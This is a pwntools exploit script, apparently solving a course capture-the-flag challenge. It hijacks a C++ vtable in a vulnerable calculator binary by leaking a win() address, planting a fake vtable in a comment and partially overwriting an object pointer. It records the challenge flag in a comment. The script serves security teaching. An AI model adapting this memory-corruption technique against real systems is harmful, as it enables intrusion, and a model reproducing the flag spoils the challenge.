#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
libc_plus_plus = pwn.ELF("./libstdc++.so.6.0.30")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/calc')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

#conn = pwn.remote('tasks.ws24.softsec.rub.de', 32988)
conn = pwn.remote('127.0.0.1', 1024)

# 1) leak win() address
address_win = int(conn.recvline()[-13:-1],16)
print(f'win function at: {hex(address_win)}')

# 2) store fake vtable in Comment
fake_vtable = pwn.p64(address_win) * 10
payload = b'//aaaaaa' + fake_vtable
conn.sendline(payload)

# 3) change name of comment
#    there is an overflow an we can (partially) override the "Expr *expr" pointer of the NamedExpr struct
#    we only override last byte (last 3 nibbles=12 bit unchanged by ASLR) and point into the "Comment" class/struct +8
#    this way the string pointer is misinterpreted as the vtable pointer
#    we already wrote the malicious vtable as content :)
modified_address_byte_of_comment = b'\x58'
payload = b'v0attaaaaaaacker' + modified_address_byte_of_comment
message = payload + b' := ' + b'v0'
conn.sendline(message)

# 4) get our name of our comment (now a bit messed up)
conn.sendline(b'list()')
conn.recvline()
conn.recvline()
name = conn.recvline()[:-1]
print(f'name: {name}')

# 5) trigger vtable lookup (e.g. with dump(var_name))
conn.sendline(b'dump(' + name + b')')
conn.recvline()
flag = conn.recvline()

# softsec{oIyZHi8bGJpil7h5jQnpqavJ1eOudtzk7EZsiaxNgsUH671rXxoxEMSVQ9jiOJMy}
print(flag)